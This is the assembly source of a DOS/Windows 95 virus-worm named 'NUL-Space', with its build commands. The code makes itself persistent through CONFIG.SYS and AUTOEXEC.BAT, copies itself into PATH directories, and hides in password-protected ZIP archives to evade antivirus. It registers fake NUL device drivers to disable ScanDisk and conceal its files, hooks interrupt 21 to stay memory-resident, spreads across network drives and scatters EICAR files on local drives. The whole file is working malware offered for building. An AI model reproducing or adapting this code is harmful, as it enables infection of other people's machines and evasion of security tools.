; comment *

; Designed by "Q" the Misanthrope

; This virii/worm hides is NUL-Space and Cypher Text (See my "Playing Hide and
; Seek" article)  Once active this virus can not be detected by normal means.
; It hides in a file that has the same name as a NUL device driver.  It also
; hides in a ZIP file that is password protected so AV programs won't detect it.
; It has an unusual payload: it creates those stupid EICAR test files all over
; the PC.  It is network aware and only spreads by network drives.  It works
; with Windows 95.

; tasm nulspace /m2
; tlink nulspace /t
; copy nulspace.com c:\winstart.bat

; *

.286

qseg            segment byte public 'CODE'
                assume  cs:qseg,es:qseg,ss:nothing,ds:qseg
                org     00feh
counter         label   word
                org     0100h

start:

com_install     proc    near                    ;batch file starting
                db      "::"                    ;as a com file it jumps past
                js      jmp_next_part           ;the batch code
                jns     jmp_next_part
                db      0dh,0ah
                db      "@CTTY NUL",0dh,0ah     ;output off and change config
                db      "ECHO INSTALLHIGH=C:\WINSTART.BAT>>C:\CONFIG.SYS",0dh,0ah
                db      "IF %Q%==Q GOTO "       ;used for reinfection
                js      $(go_mem_res-jmp_next_part3)
                jns     $(go_mem_res-jmp_next_part3-02h)
                db      0dh,0ah
                db      ":"
jmp_next_part:  jo      jmp_next_part1          ;more stupid jumps
                jno     jmp_next_part1
                db      0dh,0ah
                db      "PKZIP -3 -- -+ -~ -S"  ;compress ourselves 
password1       db      "XXX C:\"               ;use password
random_file1    db      "QUE."                  ;random file name
random_ext1     db      "CAB C:\WINSTART.BAT",0dh,0ah
                db      "ECHO @ECHO OFF>>C:\AUTOEXEC.BAT",0dh,0ah
                db      ":"                     ;prepare autoexec for reinfect
jmp_next_part1: ja      jmp_next_part2          ;more jumps
                jb      jmp_next_part2
                db      0dh,0ah
                db      "ECHO CTTY NUL>>C:\AUTOEXEC.BAT",0dh,0ah
                db      "ECHO PKUNZIP -) -3 -O -S"
password2       db      "XXX C:\"               ;reinfect again
random_file2    db      "QUE."
random_ext2     db      "CAB>>C:\AUTOEXEC.BAT",0dh,0ah
                db      ":"
jmp_next_part2: jpe     jmp_next_part3          ;more jumps
                jpo     jmp_next_part3
                db      0dh,0ah                 ;set q=q for jmp in winstart
                db      "ECHO SET Q=Q>>C:\AUTOEXEC.BAT",0dh,0ah
                db      "ECHO CTTY CON>>C:\AUTOEXEC.BAT",0dh,0ah
                db      ":"
jmp_next_part3: js      go_mem_res              ;more jumps
                jns     go_mem_res
                db      0dh,0ah                 ;spread it around
                db      "FOR %%Q IN (%PATH% C:\) DO %COMSPEC% /F/CCOPY/B %0+%0.BAT %%Q",0dh,0ah
                db      "CTTY CON"              ;output on
                db      1ah                     ;ctrl-z
com_install     endp

go_mem_res      proc    near                    ;clear environment space
                mov     es,word ptr ds:[2ch]
                mov     ah,49h
                int     21h                     ;create NUL-Space devices
                mov     di,offset scandisk_device
                mov     cx,0003h                ;3 of them, first is scandskw
next_device:    mov     ah,52h                  ;get list of lists
                int     21h
                cld
                lds     si,dword ptr es:[bx+22h];get NUL device chain
                push    cs
                pop     es
                mov     ax,di                   ;point to new device to add
                movsw                           ;put it in chain
                movsw                           ;far pointer
                mov     word ptr ds:[si-02h],cs ;point to new device
                mov     word ptr ds:[si-04h],ax
                add     di,offset eicar_device-scandisk_device-04h
                loop    next_device             ;do eicar and winstart device
                push    cs                      ;hook interrupt 21
                pop     ds
                mov     ax,3521h
        int     21h
                mov     word ptr ds:[previous_hook],bx
                mov     word ptr ds:[previous_hook+02h],es
                mov     ax,2518h                ;save old interrupt 21 as 18
                mov     dx,bx
                push    es
                pop     ds
                int     21h
                push    cs
                pop     ds
                mov     dx,offset resident_isr21
                mov     al,21h
                int     21h
                mov     ah,31h                  ;go memory resident
                mov     dx,((tail-com_install+0110h) SHR 4)
                int     21h
go_mem_res      endp

interrupt_24    proc    near
                mov     al,03h                  ;fiddly little critical error
                iret                            ;handler
return_far:     retf                            ;retf for NUL device routines
interrupt_24    endp

vname           db      " NUL-Space "
scandisk_device dd      -1                      ;our 3 new NUL-Space devices
                dw      8004h                   ;nul character attributes
                dw      return_far              ;do nothing routines
                dw      return_far
                db      "SCANDSKW"              ;stop scandskw in windows 95
eicar_device    dd      -1
                dw      8004h
                dw      return_far
                dw      return_far
eicar_dev_name  db      "EICAR   "              ;protect those stupid eicar
winstart_device dd      -1                      ;files while we infect
                dw      8004h
                dw      return_far
                dw      return_far
win_dev_name    db      "WINSTART"              ;finally protect ourselves
winstart_file   db      "C:\WINSTART.BAT",00h   ;file name to replicate
eicar_drive     db      "C:"                    
eicar_file      db      "EICAR."                
eicar_ext       db      "QUE",00h
drive_number    dw      27

eicar           proc    near                    ;stupid EICAR file
        pop ax
                xor     ax,214Fh
        push    ax
                and     ax,4140h
        push    ax
        pop bx
                xor     al,5Ch
        push    ax
        pop dx
        pop ax
                xor     ax,2834h
        push    ax
        pop si
                sub     [bx],si
        inc bx
        inc bx
                sub     [bx],si
                jge     terminate
eicar_text      db      'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$'
terminate:      dec     ax
                sub     cx,[bx+si+2Ah]
                db      0dh,0ah
eicar_length    label   byte
eicar           endp

create_random3  proc    near
                mov     cx,0003h                ;3 byte random file
setname:        xor     ax,ax                   ;random name at ds:si & ds:di
        out     43h,al
        push    cx
        in      al,40h
        mov     cx,ax
around:         loop    around                  ;psuedo random delay
        pop     cx
        and     al,1fh                  ;32 letters possible
        add     al,'A'
        cmp     al,'Z'
        jbe     nameit
        sub     al,42                   ;if above Z then make it 1-6
nameit:         stosb                           ;save random name
                mov     byte ptr es:[si],al
                inc     si
incloop:        in      al,40h                  ;get the high byte
        loop    setname
                retn
create_random3  endp

resident_isr21  proc    near
                pusha
                push    ds
                push    es
                pushf
                push    cs
                pop     ds
                cld
                inc     word ptr ds:[counter]   ;only infect every 65536 times
                jz      infect_now              ;into interrupt 21h
                jmp     not_infect_now
infect_now:     mov     ax,3524h                ;set critical error handler
                int     18h
                push    es
                pusha
                mov     dx,offset interrupt_24  ;our handler
                mov     ah,25h
                int     18h
                push    cs
                pop     es                      ;get drive to infect
next_drive:     mov     bx,word ptr ds:[drive_number]
                cmp     bx,27                   ;is it past drive Z: ?
                jb      save_letter
                mov     bl,02h
save_letter:    inc     bx                      ;inc and save for next time
                mov     word ptr ds:[drive_number],bx
check_next:     mov     ax,4409h                ;see if network or local drive
                int     18h
                jc      next_drive              ;if neither get next drive
                xchg    ax,bx
                add     al,"@"                  ;save drive letter
                mov     byte ptr ds:winstart_file,al
                mov     byte ptr ds:eicar_drive,al
                test    dh,10h                  ;test for network
                jz      eicar_dropper           ;if local then drop EICARs
                mov     di,offset password1     ;create new cypher text file
                mov     si,offset password2     ;to be made from winstart
                call    create_random3
                mov     di,offset random_file1  ;random file name
                mov     si,offset random_file2
                call    create_random3
                cmpsb
                call    create_random3          ;and random extension
                mov     di,offset eicar_file    ;random file name
                mov     si,offset eicar_dev_name
                pusha
                call    create_random3
                popa
                cmpsw
                call    create_random3          ;and more random name
                mov     dx,offset winstart_file ;create worm
                mov     di,offset win_dev_name  ;disable nul-space driver
                mov     ah,5bh                  ;create new file
                xor     byte ptr ds:[di],ah
                xor     cx,cx                   ;normal attributes
                int     18h
                mov     byte ptr ds:[di],"W"    ;set nul-space driver back
                jc      unable_infect
                mov     dx,0100h                ;point to start of winstart
                mov     cx,offset previous_hook-start
                jmp     short write_file        ;create file
eicar_dropper:  mov     di,offset eicar_ext     ;create EICAR file
                mov     si,di                   ;random extension
                call    create_random3
                mov     di,offset eicar_dev_name
                mov     ah,5bh                  ;create new file
                xor     byte ptr ds:[di],ah     ;disable nul-space driver
                mov     dx,offset eicar_drive   ;point to file
                mov     cl,07h                  ;readonly, hidden and system
                int     18h
                mov     byte ptr ds:[di],"E"    ;enable nul-space again
                mov     dl,low(offset eicar)    ;point to EICAR file
                mov     cl,low(offset eicar_length-eicar)
write_file:     mov     bh,40h                  ;write EICAR or winstart file 
                xchg    ax,bx
                int     18h
                mov     ax,5701h                ;set date
                mov     dx,229fh
                int     18h
                mov     ah,3eh                  ;close it
                int     18h
unable_infect:  popa                            ;done
                pop     es
                mov     dx,bx                   ;set critical error back
                int     18h
not_infect_now: popf
pop_it:         pop     es
pop_ds_and_all: pop     ds
        popa    
resident_isr21  endp

far_jmp         proc    near
        db      0eah
previous_hook:  label   double                  ;previous interrupt 21
far_jmp         endp

                org     $+04h
tail            label   byte
qseg            ends
                end     start
